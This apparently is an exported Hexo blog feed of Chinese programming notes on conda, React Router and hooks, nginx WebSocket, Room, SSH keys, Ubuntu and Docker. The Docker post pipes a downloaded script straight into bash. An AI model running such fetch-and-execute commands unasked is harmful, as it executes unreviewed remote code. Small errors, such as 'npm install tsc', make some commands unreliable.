建议conda只用来更新conda和python、下载和更新python包使用pip，因为清华源和交大源下载速度远远不及阿里源和华为源。



更新conda
conda update conda
更新python
conda update python
更新所有包
conda update --all
清除无用的包
conda clean -p        # 清理无用的包conda clean -t        # 清理tar包conda clean -y --all  # 清理所有安装包及cache
conda管理虚拟环境，他默认为base环境需要打开自动进入base环境，使用下面的命令：
conda config --set auto_activate_base true
创建自定义环境
conda create --name py38 python=3.8
查看所有环境
conda env list


安装pytorch-. 首先，打开miniconda的命令行然后，先在conda中创建一个python环境，设置python版本为3.8conda create -name pytorch python=3.8
然后，激活这个环境，准备安装pytorch执行conda activate pytorch便完成环境的切换。-. 进入pytorch官网，选择自己需要的配置然后复制其内容。即可完成pytorch的安装了。执行：如果返回True即完成了安装过程
jupyter的安装在激活了pytorch环境后，执行以下命令。pip install jupyter notebook
然后就算完成了。执行jupyter notebook即可进入jupyter

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title>react router速成</title>
    <url>/posts/36012751/</url>
    <content><![CDATA[新版本（约定式书写）导入包// npmnpm install react-router-dom@6// pnpmpnpm add react-router-dom@6// yarnyarn add react-router-dom@6

在介绍 React Router 的概念以前，需要先区分两个概念：
react-router：为 React 应用提供了路由的核心功能；react-router-dom：基于 react-router，加入了在浏览器运行环境下的一些功能。
使用BrowserRouter要想在 React 应用中使用 React Router，就需要在 React 项目的根文件（index.tsx）中导入 Router 组件：
import &#123; StrictMode &#125; from &quot;react&quot;;import * as ReactDOMClient from &quot;react-dom/client&quot;;import &#123; BrowserRouter &#125; from &quot;react-router-dom&quot;;import App from &quot;./App&quot;;const rootElement = document.getElementById(&quot;root&quot;);const root = ReactDOMClient.createRoot(rootElement);root.render(  &lt;StrictMode&gt;    &lt;BrowserRouter&gt;      &lt;App /&gt;    &lt;/BrowserRouter&gt;  &lt;/StrictMode&gt;);

BrowserRouter 是最常用的路由方式，即浏览器路由。官方文档也建议将 BrowserRouter 组件用于 Web 应用程序。除了这种方式，React Router 还支持其他几种路由方式：

HashRouter：在路径前加入#成为一个哈希值，Hash 模式的好处是不会因为刷新页面而找不到对应路径；
MemoryRouter：不存储 history，路由过程保存在内存中，适用于 React Native 这种非浏览器环境；
NativeRouter：配合 React Native 使用，多用于移动端；
StaticRouter：主要用于服务端渲染时。

LinkLink 组件和 NavLink 组件的使用方式类似，例如在产品页面有一个返回首页的按钮，需要传递给 to 需要跳转的路径：
import &#123; Link &#125; from &quot;react-router-dom&quot;;import &quot;./styles.css&quot;;export default function Product() &#123;  return (    &lt;div className=&quot;product&quot;&gt;      &lt;header&gt;        &lt;Link to=&quot;/&quot;&gt;返回首页&lt;/Link&gt;      &lt;/header&gt;    &lt;/div&gt;  );&#125;

如果需要对 Link 进行更多控制，也可以传递给 to 一个对象，在这个对象中，可以通过 search 属性来添加查询字符串或通过 hash 属性来传递 hash值，例如：
import &#123; Link &#125; from &quot;react-router-dom&quot;;import &quot;./styles.css&quot;;export default function Settings() &#123;  return (    &lt;div className=&quot;settings&quot;&gt;      &lt;header&gt;        &lt;h1&gt;Hello World&lt;/h1&gt;        &lt;Link          to=&#123;&#123;            pathname: &quot;/settings&quot;,            search: &quot;?sort=date&quot;,            hash: &quot;#hash&quot;          &#125;&#125;        &gt;          设置        &lt;/Link&gt;      &lt;/header&gt;    &lt;/div&gt;  );&#125;

Routes下面来看看如何将路由映射为对应的页面（组件）。首先需要从 react-router-dom 中导入一个名为 Routes 的组件，它将包含可以在页面特定部分显示的所有不同的路由。
在 index.tsx 中进行如下修改：
import &#123; NavLink, Routes, Route &#125; from &quot;react-router-dom&quot;;import Product from &quot;./Product&quot;;import &quot;./styles.css&quot;;export default function App() &#123;  return (    &lt;div className=&quot;App&quot;&gt;      &lt;header&gt;        &lt;h1&gt;Hello World&lt;/h1&gt;      &lt;/header&gt;      &lt;nav&gt;        &lt;NavLink to=&quot;&quot;&gt;首页&lt;/NavLink&gt;        &lt;NavLink to=&quot;product&quot;&gt;产品&lt;/NavLink&gt;        &lt;NavLink to=&quot;about&quot;&gt;关于&lt;/NavLink&gt;      &lt;/nav&gt;      &lt;Routes&gt;          &lt;/Routes&gt;    &lt;/div&gt;  );&#125;

我们需要在 Routes 组件中使用 Route 组件来定义所有路由。该组件接受两个 props：
path：页面 URL 应导航到的路径，类似于 NavLink 组件的 to；element：页面导航到该路由时加载的元素。
Route 组件用于将应用的位置映射到不同的 React 组件。例如，当用户导航到 &#x2F;product 路径时呈现 Product 组件，可以这样来写：
import &#123; NavLink, Routes, Route &#125; from &quot;react-router-dom&quot;;import Product from &quot;./Product&quot;;import About from &quot;./About&quot;;import Home from &quot;./Home&quot;;import Error from &quot;./Error&quot;;import &quot;./styles.css&quot;;export default function App() &#123;  return (    &lt;div className=&quot;App&quot;&gt;      &lt;header&gt;        &lt;h1&gt;Hello World&lt;/h1&gt;      &lt;/header&gt;      &lt;nav&gt;        &lt;NavLink to=&quot;&quot;&gt;首页&lt;/NavLink&gt;        &lt;NavLink to=&quot;product&quot;&gt;产品&lt;/NavLink&gt;        &lt;NavLink to=&quot;about&quot;&gt;关于&lt;/NavLink&gt;      &lt;/nav&gt;      &lt;Routes&gt;        &lt;Route path=&quot;/&quot; element=&#123;&lt;Home /&gt;&#125; /&gt;        &lt;Route path=&quot;/product&quot; element=&#123;&lt;Product /&gt;&#125; /&gt;        &lt;Route path=&quot;/about&quot; element=&#123;&lt;About /&gt;&#125; /&gt;        &lt;Route path=&quot;*&quot; element=&#123;&lt;Error /&gt;&#125; /&gt;      &lt;/Routes&gt;    &lt;/div&gt;  );&#125;

如果想要在所有 Route 都不匹配时就渲染 404 页面，只需将 404 页面对应的 Route 的 path 设置为 *：
&lt;Routes&gt;  &lt;Route path=&quot;/&quot; element=&#123;&lt;Home /&gt;&#125; /&gt;  &lt;Route path=&quot;product&quot; element=&#123;&lt;Product /&gt;&#125; /&gt;  &lt;Route path=&quot;about&quot; element=&#123;&lt;About /&gt;&#125; /&gt;  &lt;Route path=&quot;*&quot; element=&#123;&lt;Error /&gt;&#125; /&gt;&lt;/Routes&gt;

编程式导航React Router 提供了两种不同的编程式导航方式：
声明式导航组件：&lt;Navigate&gt; 组件命令式导航方法：useNavigate Hook
我们可以使用这两种编程的方式来跳转到指定的路由，也可以实现路由的重定向，比如在浏览器的地址栏输入一个 URL 并进行跳转时，如果应用中没有定义该路由，就跳转到应用的首页。
Navigate&lt;Navigate&gt;组件是一种声明式的导航方式。使用 Navigate 组件时，首先需要从 react-router-dom 导入 Navigate 组件。然后在 Navigate 组件中通过 to props 来指定要跳转的路径：
import &#123; NavLink, Routes, Route, Navigate &#125; from &quot;react-router-dom&quot;;import Product from &quot;./Product&quot;;import About from &quot;./About&quot;;import Home from &quot;./Home&quot;;import &quot;./styles.css&quot;;export default function App() &#123;  return (    &lt;div className=&quot;App&quot;&gt;      &lt;header&gt;        &lt;h1&gt;Hello World&lt;/h1&gt;      &lt;/header&gt;      &lt;nav&gt;        &lt;NavLink to=&quot;&quot;&gt;首页&lt;/NavLink&gt;        &lt;NavLink to=&quot;product&quot;&gt;产品&lt;/NavLink&gt;        &lt;NavLink to=&quot;about&quot;&gt;关于&lt;/NavLink&gt;      &lt;/nav&gt;      &lt;Routes&gt;        &lt;Route path=&quot;/&quot; element=&#123;&lt;Home /&gt;&#125; /&gt;        &lt;Route path=&quot;product&quot; element=&#123;&lt;Product /&gt;&#125; /&gt;        &lt;Route path=&quot;about&quot; element=&#123;&lt;About /&gt;&#125; /&gt;        &lt;Route path=&quot;*&quot; element=&#123;&lt;Navigate to=&quot;/&quot; /&gt;&#125; /&gt;      &lt;/Routes&gt;    &lt;/div&gt;  );&#125;

这样，当在浏览器地址栏输入一个未定义的路由时，就会要转到首页。
useNavigateuseNavigate Hook是一种命令式导航方式。使用这个 Hook 时，首先需要从 react-router-dom 中导入 useNavigate，然后传递给它需要跳转的路由即可。假如在提交完表单之后，跳转到主页，可以这样实现：
import &#123; useNavigate &#125; from &#x27;react-router-dom&#x27;function Register () &#123;  const navigate = useNavigate()  return (    &lt;div&gt;      &lt;Form afterSubmit=&#123;() =&gt; navigate(&#x27;/&#x27;)&#125; /&gt;    &lt;/div&gt;  )&#125;
通过路由传递状态//发送数据&lt;Link to=&quot;/&quot; state=&#123;&quot;From Product&quot;&#125;&gt;//接受数据import &#123; useLocation &#125; from &quot;react-router-dom&quot;;import &quot;./styles.css&quot;;export default function Settings() &#123;  let location = useLocation();  return (    &lt;div className=&quot;App&quot;&gt;      &lt;header&gt;首页&lt;/header&gt;      &lt;p&gt;&#123;location.state&#125;&lt;/p&gt;    &lt;/div&gt;  );&#125;


引用自React Router v6 完全指南

旧版本（类似vue一样的格式书写）最新官方网站暂不支持中文,阅读起来稍显麻烦.该篇教程面向的是react router6.22.3的版本,并且使用的是ts

因为我也不是很懂,所以在看完一小部分后,准备写一个面向新手的教程(主要是怕自己以后忘了怎么写路由)

创建项目# xxx是你的项目名称npx create-react-app xxx -template typescript# 安装react-router-domnpm install react-router-dom@6.22.3# types暂时没有支持这么高的版本# npm instasll @types/react-router-dom@6.22.3

index.tsx就是我们项目的入口地址:
我们进行以下的修改:

简化App.tsx的内容
 import React from &#x27;react&#x27;;function App() &#123;return (    &lt;div &gt;    Hello react    &lt;/div&gt;);&#125;export default App;

修改index.tsx为这部分内容
 import React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom/client&#x27;;import &#x27;./index.css&#x27;;import App from &#x27;./App&#x27;;import reportWebVitals from &#x27;./reportWebVitals&#x27;;import &#123;    createBrowserRouter,    RouterProvider,    Route,    Link,&#125; from &quot;react-router-dom&quot;;//添加路由const router = createBrowserRouter([    &#123;        //路径        path: &quot;/&quot;,        //元素(可以导入其他的元素,也可以直接编写一个html)        element: &lt;App /&gt;,    &#125;,    &#123;        path: &quot;/about&quot;,        element: &lt;div&gt;About&lt;/div&gt;,    &#125;,    &#123;        path: &quot;/contact&quot;,        element: &lt;div&gt;Contact&lt;/div&gt;,    &#125;,])const root = ReactDOM.createRoot(document.getElementById(&#x27;root&#x27;) as HTMLElement);root.render(&lt;React.StrictMode&gt;    //绑定router    &lt;RouterProvider router=&#123;router&#125;/&gt;&lt;/React.StrictMode&gt;);// If you want to start measuring performance in your app, pass a function// to log results (for example: reportWebVitals(console.log))// or send to an analytics endpoint. Learn more: https://bit.ly/CRA-vitalsreportWebVitals();

以上就是最基础的路由配置,你已经入门了.
子路由(Index)import &#123;Outlet&#125; from &#x27;react-router-dom&#x27;... &#123;        path: &quot;/about&quot;,        element: &lt;div&gt;About            &lt;Outlet/&gt;        &lt;/div&gt;,        children: [            &#123;index: true, element: &lt;div&gt;Index&lt;/div&gt;&#125;,            &#123;                path: &quot;me&quot;,                element: &lt;div&gt;About me&lt;/div&gt;,            &#125;        ]    &#125;,

子页面会展示在Outlet内.子路由可以设定一个index元素,可以设置默认展示的子页面
配置错误页面如这样配置,或者添加一个react元素,每次访问到没有的页面都会进入这个内容
&#123;        path: &quot;/&quot;,        element: &lt;App/&gt;,        errorElement: &lt;div&gt;404&lt;/div&gt;,    &#125;,

动态路由,参数传递(loader)不使用loader,直接通过useParams来获取参数const router = createBrowserRouter([  &#123;    // it renders this element    element: &lt;Team /&gt;,    // when the URL matches this segment    path: &quot;teams/:teamId&quot;,    // with this data loaded before rendering    loader: async (&#123; request, params &#125;) =&gt; &#123;      return fetch(        `/fake/api/teams/$&#123;params.teamId&#125;.json`,        &#123; signal: request.signal &#125;      );    &#125;,    // performing this mutation when data is submitted to it    action: async (&#123; request &#125;) =&gt; &#123;      return updateFakeTeam(await request.formData());    &#125;,    // and renders this element in case something went wrong    errorElement: &lt;ErrorBoundary /&gt;,  &#125;,]);//useParamsfunction Team() &#123;  let params = useParams();  console.log(params.teamId); // &quot;hotspur&quot;&#125;

我们通过类似&quot;teams/:teamId&quot;的形式设置动态路由,如果要获取动态路由传递过来的参数,通常是使用useParams()的方法来获取
使用loader我们使用loader,就不需要使用useParams(),他会自动替你执行useParams的方法,然后你只需解构就能获取参数,然后通过修改数据来传入更多的内容.图示:如果我们是使用vue的话,可能会获取参数后,在mount方法中,设置我们需要初始化的所有数据,而react帮我们把数据初始化的过程抽出来放在loader中
//类似这样export default function Root() &#123;  const &#123; contacts &#125; = useLoaderData();  return (    &lt;div&gt;contacts.data&lt;/div&gt;  )&#125;

action这个功能可能用的不多,他会把你页面中原生的html的form表单全部捕获,原本发送到服务器的表单数据,会发送到action中,然后在进行细致的操作我这里不详细讲,因为可能用的不多,想更多了解到可以看看官网
]]></content>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx配置ws</title>
    <url>/posts/e3802614/</url>
    <content><![CDATA[在恢复服务器的过程中，get 到的一个小知识：因为所有的服务都是通过 nginx 代理出来的。而默认配置下并没有对 ws 进行代理。
WS的全称是WebSocket，Nginx配置WebSocket也比较简单，只需要在nginx.conf文件中进行相应的配置。这种方式很简单，但是很有效，能够横向扩展WebSocket服务端的服务能力。
这里直接贴代码：
map $http_upgrade $connection_upgrade &#123;    default upgrade;    &#x27;&#x27; close;&#125;# 如果$http_upgrade 不为 &#x27;&#x27; (空)， 则$connection_upgrade 为 upgrade 。# 如果$http_upgrade 为 &#x27;&#x27; (空)， 则 $connection_upgrade 为 close。server&#123;    ...    location / &#123;            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;            proxy_set_header X-Forwarded-Proto $scheme;            proxy_set_header Host $host:$server_port;            proxy_set_header X-Real-IP $remote_addr;            proxy_set_header Range $http_range;            proxy_set_header If-Range $http_if_range;            proxy_redirect off;            proxy_pass http://immich_server:2283;            # the max size of file to upload            client_max_body_size 20000m;            # 下面这两行是关键            proxy_set_header Upgrade $http_upgrade;            proxy_set_header Connection $connection_upgrade;            # proxy_set_header Upgrade $http_upgrade; 表示设置Upgrade不变            # proxy_set_header Connection $connection_upgrade; 表示如果 $http_upgrade为upgrade，则请求为upgrade(websocket)，如果不是，就关闭连接            &#125;&#125;
]]></content>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>react快速过知识点</title>
    <url>/posts/a27176ba/</url>
    <content><![CDATA[创建react项目在终端输入npx create-react-app xxx创建一个react项目,通过npm start启动该项目.
index.js
StrickMode是一个严格模式,它可以严格的进行功能审查
组件方式
函数式组件
JSX语法,将html+js融合的很深,他每个组件只能返回一个根元素.每个组件都需要正确的闭合
插值功能,通过&#123;&#125;来实现js的内容插入到html中.同样的html的标签可以直接作为值存储在js的类中.而不用在加上字符串符号.
因为每次都只能返回一个根元素,通常的做法是用&lt;&gt;&lt;/&gt;来进行闭合.当然有些元素需要传入key或者其他属性,这时候就可以使用react提供的Fragment来进行闭合
样式设置.他使用的是className来代替原来的class  


类组件

组件通信通过props和解构的方式来实现组件间的通信传值他可以单个数据单个数据的传输,也可以直接传进来一个对象,然后再获取对象中的值,都是没问题的传递组件而且父组件也可以向子组件传递另一个组件,只要把这个组件放在对应的html中,他就可以正确的展示出来
子组件传递给父组件这里简单讲就是

状态提升,将该组件的属性提升到父组件中,然后通过传参的方式让子组件引用父组件的属性
自定义事件下传,再将修改这个属性的方法封装后传递给子组件,让子组件调用这个方法进行修改.

React的常用HookuseState最基础的状态管理
// 推断类型为 &quot;boolean&quot;const [enabled, setEnabled] = useState(false);

enabled是状态值,而setEnabled是一个方法,他可以设置你的状态值
useReducer他使用MVI的开发思路,将意图和状态分开,可以在https://zfxt.top/posts/c7f557a/?highlight=mvi查看关于MVI的相关属性.
import &#123;useReducer&#125; from &#x27;react&#x27;;interface State &#123;   count: number &#125;;type CounterAction =  | &#123; type: &quot;reset&quot; &#125;  | &#123; type: &quot;setCount&quot;; value: State[&quot;count&quot;] &#125;const initialState: State = &#123; count: 0 &#125;;function stateReducer(state: State, action: CounterAction): State &#123;  switch (action.type) &#123;    case &quot;reset&quot;:      return initialState;    case &quot;setCount&quot;:      return &#123; ...state, count: action.value &#125;;    default:      throw new Error(&quot;Unknown action&quot;);  &#125;&#125;export default function App() &#123;  const [state, dispatch] = useReducer(stateReducer, initialState);  const addFive = () =&gt; dispatch(&#123; type: &quot;setCount&quot;, value: state.count + 5 &#125;);  const reset = () =&gt; dispatch(&#123; type: &quot;reset&quot; &#125;);  return (    &lt;div&gt;      &lt;h1&gt;欢迎来到我的计数器&lt;/h1&gt;      &lt;p&gt;计数： &#123;state.count&#125;&lt;/p&gt;      &lt;button onClick=&#123;addFive&#125;&gt;加 5&lt;/button&gt;      &lt;button onClick=&#123;reset&#125;&gt;重置&lt;/button&gt;    &lt;/div&gt;  );&#125;

这个钩子需要接受两个参数,第一个是接受到意图时,进入某个方法,判断意图并操作,第二个参数是初始状态.然后使用这个dispatch方法时,需要传递对应的参数来判断需要进行什么操作.useContext这就是个全局隐式传递方法的函数,我们一般传递属性都是通过props,显然的传递我们需要传递的对象,这样往往需要很多的操作,规定父子组件如何传递如何接受,而使用useContext就可以进行隐式的接受,他是直接在ui树上进行传递的,也就是所有的子组件都可以获取.(包括递归的子组件)
import &#123; createContext, useContext &#125; from &#x27;react&#x27;;const ThemeContext = createContext(null);export default function MyApp() &#123;  return (    &lt;ThemeContext.Provider value=&quot;dark&quot;&gt;      &lt;Form /&gt;    &lt;/ThemeContext.Provider&gt;  )&#125;function Form() &#123;  return (    &lt;Panel title=&quot;Welcome&quot;&gt;      &lt;Button&gt;Sign up&lt;/Button&gt;      &lt;Button&gt;Log in&lt;/Button&gt;    &lt;/Panel&gt;  );&#125;function Panel(&#123; title, children &#125;) &#123;  const theme = useContext(ThemeContext);  const className = &#x27;panel-&#x27; + theme;  return (    &lt;section className=&#123;className&#125;&gt;      &lt;h1&gt;&#123;title&#125;&lt;/h1&gt;      &#123;children&#125;    &lt;/section&gt;  )&#125;function Button(&#123; children &#125;) &#123;  const theme = useContext(ThemeContext);  const className = &#x27;button-&#x27; + theme;  return (    &lt;button className=&#123;className&#125;&gt;      &#123;children&#125;    &lt;/button&gt;  );&#125;

他的步骤就是create,再provider,然后使用useContext获取.useMemo进行数据缓存的钩子,用来跳过代价昂贵的重新计算
import &#123; useMemo &#125; from &#x27;react&#x27;;function TodoList(&#123; todos, tab, theme &#125;) &#123;  const visibleTodos = useMemo(() =&gt; filterTodos(todos, tab), [todos, tab]);  // ...&#125;

设置只有在某些数据变化时,他才会重新渲染,避免因为其他组建的渲染导致的重新计算useCollback与useMemo类似,但是他是缓存函数而不是数据useRef

记录状态他会记住你当前这个值的状态,并且他不会随着你对该元素的修改而重新渲染页面,也就是不会你的更新不会立刻展示在页面中.
获取dom他的获取方式是.current来获取,他还可以直接获取dom元素的引用,或者其他的子组件,这样他可以直接调用这个原生dom的方法(例如获取input框,然后使用其对焦功能)或者子组件的方法(这样子要求,他才能调用子组件的方法.) 

useEffect副作用函数
function MyComponent() &#123;  useEffect(() =&gt; &#123;  // 这里的代码会在每次渲染后执行&#125;);useEffect(() =&gt; &#123;  // 这里的代码只会在组件挂载后执行&#125;, []);useEffect(() =&gt; &#123;  //这里的代码只会在每次渲染后，并且 a 或 b 的值与上次渲染不一致时执行&#125;, [a, b]);  return &lt;div /&gt;;&#125;

他的第二个参数,如果是空他就每次渲染都执行.就是监控值,每次修改这个监控值,都会导致他的Effect的调用,
memo方法如果这个组件的props没有发生变化,他就不会进行重新渲染他通常与useCallback一起使用,这样子才能实现props的不发生变化(如果不缓存方法的话,他传递的props每次都会变更为一个新方法)
]]></content>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title>repeat函数循环执行函数体</title>
    <url>/posts/d10d893f/</url>
    <content><![CDATA[关键字kotlinrepeat(3){  println(“hello,world”)}
他会将repeat中的函数体执行3遍

]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>springboot配置ssl证书</title>
    <url>/posts/3ad93a0f/</url>
    <content><![CDATA[首先如何ssl证书可以从这篇文章中得到：白嫖永久泛域名证书
配置springboot的ssl证书
在resource目录下传入你的证书文件(.pem .cer .crt .jks .PFX)和密钥文件(.txt) 如果你的证书文件不符合格式，也可以进行ssl证书转化 不同格式的ssl证书都是可以相互转化的

修改配置文件在application.yml中配置你的ssl证书
 server:port: 443    #HTTPS协议默认端口号为443，需要使用其他端口时，您可以在此处自定义。ssl:    key-alias: tomcat    #证书别名    key-store-password: ********    #填写jks-password.txt文件内的密码。    key-store-type: JKS #JKS格式证书密钥库类型。PFX格式的证书密钥库类型为PKCS12。    key-store: classpath:domain_name.jks   #您需要使用实际的证书名称替换domain_name.jks。

获取自己的证书别名（一般就是你的域名）如果您忘记证书别名，您可以尝试通过JDK自带的密钥与证书管理工具keytool工具查询。命令示例为keytool -list -v -keystore &lt;domain_name.jks&gt; -storepass &lt;password&gt;。

验证ssl是否配置完成将项目启动到服务器后，通过域名访问，如果访问成功则没有问题如果是在本地访问。可以选择修改hosts文件，为域名添加上localhost的映射，如果访问没有问题则配置完成


]]></content>
      <tags>
        <tag>ssl证书</tag>
      </tags>
  </entry>
  <entry>
    <title>room数据库最佳实践</title>
    <url>/posts/5a9563fd/</url>
    <content><![CDATA[特性1.SQL语句高亮2. 简单入门3. 功能强大4. 数据库监听5. 支持Kotlin协程&#x2F;RxJava&#x2F;Guava
依赖dependencies&#123;    val room_version = &quot;2.2.0-rc01&quot;    implementation(&quot;androidx.room:room-runtime:$room_version&quot;)    annotationProcessor &quot;androidx.room:room-compiler:$room_version&quot;     // Kotlin 使用 kapt 替代 annotationProcessor (需要在插件中应用kapt)    //kapt (&quot;androidx.room:room-compiler:2.6.1&quot;)    // 可选 - Kotlin扩展和协程支持    implementation(&quot;androidx.room:room-ktx:$room_version&quot;)&#125;

使用ROOM会在创建数据库对象时就会创建好所有已注册的数据表结构

创建数据库
创建操作接口
创建数据类: 一般为JSON反序列出的data class

实体类@Entity(tableName = &quot;todo_item&quot;)data class ToDoItem(    @PrimaryKey(autoGenerate = true)    val id: Int = 0,    val title: String = &quot;&quot;,    val date: String = System.currentTimeMillis().toString(),    var completed: Boolean = false,    var archived: Boolean = false)

Dao接口@Daointerface ToDoItemDao &#123;    @Query(&quot;SELECT * FROM todo_item WHERE archived = 0  ORDER BY id DESC&quot;)    fun getAll(): List&lt;ToDoItem&gt;    @Insert    suspend fun insert(toDoItem: ToDoItem):Long    @Update    suspend fun update(toDoItem: ToDoItem)&#125;

数据库实体@Database(entities = [ToDoItem::class], version = 2, exportSchema = false)abstract class RoomDB : RoomDatabase() &#123;    abstract fun ToDoItemDao(): ToDoItemDao    companion object &#123;        private var INSTANCE: RoomDB? = null        fun getInstance(context: Context): RoomDB &#123;            return runBlocking(Dispatchers.IO) &#123;                var instance = INSTANCE                if (instance == null) &#123;                    instance = Room.databaseBuilder(context, RoomDB::class.java, &quot;todo_db&quot;)                        .allowMainThreadQueries()//允许在主线程操作                        .addCallback(DbCreateCallBack())//增加回调监听                        .addMigrations(MIGARATION_1_2)//增加数据库迁移                        .build()                &#125;                instance            &#125;        &#125;        val MIGARATION_1_2 = object : Migration(1, 2) &#123;            override fun migrate(db: SupportSQLiteDatabase) &#123;                db.execSQL(&quot;ALTER TABLE todo_item ADD COLUMN archived INTEGER NOT NULL DEFAULT 0&quot;)            &#125;        &#125;        private fun DbCreateCallBack(): RoomDatabase.Callback &#123;            return object : RoomDatabase.Callback() &#123;                //第一次创建数据库时调用                override fun onCreate(db: SupportSQLiteDatabase) &#123;                    super.onCreate(db)                    Log.d(&quot;First&quot;, &quot;first onCreate db version: &quot; + db.version)                &#125;            &#125;        &#125;    &#125;&#125;

DQLROOM支持查询函数返回四种类型

Single&#x2F;Mabye&#x2F;Completable&#x2F;Observable&#x2F;Flowable 等RxJava的被观察者
LiveData: JetPack库中的活跃观察者
Flow: Kotlin协程中的流
Cursor: SQLite在Android中最原始的查询结果集, 此返回对象无法监听数据库变化

我不再推荐在项目中使用RxJava, 因为无法方便实现并发并且容易产生回调地域. 这里建议使用协程
@Query(&quot;select * from Book&quot;)fun find(): Flow&lt;Array&lt;Book&gt;&gt;@Query(&quot;select * from Book&quot;)fun find(): Observable&lt;Array&lt;Book&gt;&gt;@Query(&quot;select * from Book&quot;)fun find(): LiveData&lt;Array&lt;Book&gt;&gt;@Query(&quot;select * from Book&quot;)fun find(): LiveData&lt;List&lt;Book&gt;&gt; // List 或者 Array都是可以的@Query(&quot;select * from Book&quot;)fun find(): Flow&lt;Array&lt;Book&gt;&gt;@Query(&quot;select * from Book&quot;)fun find(): Cursor

多表查询,1对n,n对n这一部分内容在前期学习时用的较少,因此需要使用时可以再此学习直接看这篇文章https://juejin.cn/post/6844904079098036232

该文章借鉴于12

]]></content>
      <tags>
        <tag>android</tag>
        <tag>room数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu使用ssh密钥登录</title>
    <url>/posts/dd9695f2/</url>
    <content><![CDATA[配置公钥和私钥在Ubuntu或者Windows上运行ssh-keygen,生成一对公私钥。他会默认保存在C:/&#123;User&#125;/.ssh目录下id_rsa是私钥，需要传输到其他客户端机器，比如Windows做后续处理。id_ras.pub是公钥，里面含有公钥字符串。
然后将id_ras.pub公钥的内容复制到你ubuntu用户下的authorized_keys文件中把公钥复制到这个文件中即可。

注意，使用追加，而不是覆盖。不要把别人也部署过的公钥删除了

修改配置文件禁止密码登陆和允许免密码登陆都是通过修改&#x2F;etc&#x2F;ssh&#x2F;sshd_config 文件实现，只需要设置如下的两个选项为yes 和no即可：PubkeyAuthentication yesPasswordAuthentication no
修改完毕后重启ssh 服务：sudo service ssh restart

注意，有的时候，你会发现你修改的配置没有生效。因为他在这个目录下也有相同的配置文件。你需要将这个目录下的配置文件也修改后才可以生效。

]]></content>
      <categories>
        <category>本地化服务</category>
      </categories>
  </entry>
  <entry>
    <title>sqlite没有boolean类型</title>
    <url>/posts/b484a6ae/</url>
    <content><![CDATA[在数据库中，通常并没有具体的boolean类型，所以对于存入数据库的true或者false都会转化为1和0进行存储，因此在需要写sql语句的时候需要注意这一点。
]]></content>
      <categories>
        <category>sqlite</category>
      </categories>
  </entry>
  <entry>
    <title>ubuntu server快速启动</title>
    <url>/posts/a63a6c9a/</url>
    <content><![CDATA[在配置本地服务器时，安装了ubuntu server他有一个默认配置就是会在启动时检查所有网口是否都正确配置了网络。而且这个时候他会等待接近2分钟以上的时间，而对于部分人而言，只连接一个网口就足够使用了。所以为了快速启动服务跳过这些等待时间需要修改一些配置参数
自检命令：systemd-analyze blame系统自查，会检测系统启动耗费了哪些时间
/etc/systemd/system/network-online.target.wants在这个目录下，有关于系统网络启动时的配置文件：systemd-networkd-wait-online.service
加上TimeoutStartSec=3sec这个参数后，执行系统重启，你就可以享受快速的系统重启了
]]></content>
      <categories>
        <category>本地化服务</category>
      </categories>
  </entry>
  <entry>
    <title>ts</title>
    <url>/posts/c3868e8b/</url>
    <content><![CDATA[TS入门typeScript 必须转译为 js才可以在浏览器中或者node中运行
转译器：tsc命令进行ts到js的转译安装tsc：
# 安装npm install tsc -g# 使用tsc code.ts

相关语法：

类型声明他与kotlin的类型声明很相似不同的是他的？用来确定他的参数是否需要传入当然编译器可以自动推断出来
联合类型他允许一个变量可以是多个类型更多的使用是：他也可以限制某个变量的取值，如let gender: &#x27;male&#x27; | &#x27;female&#x27;；gender = &#x27;male&#x27;;
函数类型在ts中可以传入函数作为参数，这可以很好的作为回调使用
别名type UserID = number | string;

当我们要使用一些特定的第三方库，但是某些库可能对ts不那么支持，我们可是使用社区提供的特定类型包，这些包都有一个@types&#x2F;包名的前缀，@types/three
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>ts</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu修改计算机名</title>
    <url>/posts/c4b6629f/</url>
    <content><![CDATA[
打开hostssudo gedit /etc/hosts

然后修改第二行的内容，把genius-Lenovo-ideapad-Y700-15ISK修改为你想要的计算机名字，最后保存
然后在终端中输入 gedit &#x2F;etc&#x2F;hostname
将内容修改为你想要的名字，保存，重启，OK

]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
  </entry>
  <entry>
    <title>一键安装docker</title>
    <url>/posts/266cf7d5/</url>
    <content><![CDATA[安装dockerdocker官方提供了傻瓜式安装脚本，为你做好所有工作，免去了手动安装的繁琐。
本文实测系统环境：debian11
执行以下命令

不知道从什么时候开始官方脚本已经默认也安装了 docker compose, 不需要后面的手动安装了, 因此已删除多余的内容

也就是说, 只需要执行下面的一键脚本

注意是 docker compose 而不是 docker-compose. 执行命令时候也没有这个杠

curl -fsSL https://get.docker.com | bash -s docker

可在此命令后附带–mirror参数设置镜像源，以提高国内服务器下载docker的速度
如使用阿里云镜像:
curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun

docker主动代理
创建或修改 Docker 配置文件

vim /etc/docker/daemon.json# 内容如下：&#123; &quot;proxies&quot;:   &#123;     &quot;httpProxy&quot;: &quot;http://172.17.0.1:8123&quot;,     &quot;httpsProxy&quot;: &quot;http://172.17.0.1:8123&quot;,     &quot;noProxy&quot;: &quot;localhost,127.0.0.1,.daocloud.io&quot;   &#125;&#125;


重新加载并重启 Docker 服务配置完成后，重新加载 systemd 配置并重启 Docker 服务：

sudo systemctl daemon-reloadsudo systemctl restart docker

验证代理配置可以通过以下命令验证代理配置是否生效：
docker info

部署docker镜像代理第一步：Fork项目：项目为CM大佬创建维护CF-Worker
第二步：CF部署Pages，选择第一步中Fork的仓库，配置页面保持默认，点击部署
第三步：添加自定义域，绑定自己的域名


可设置环境变量URL302和URL防止域名被污染或被墙，可设置nginx页面进行伪装

CM大佬仓库还有第三方Docker官方镜像服务地址可直接使用
然后
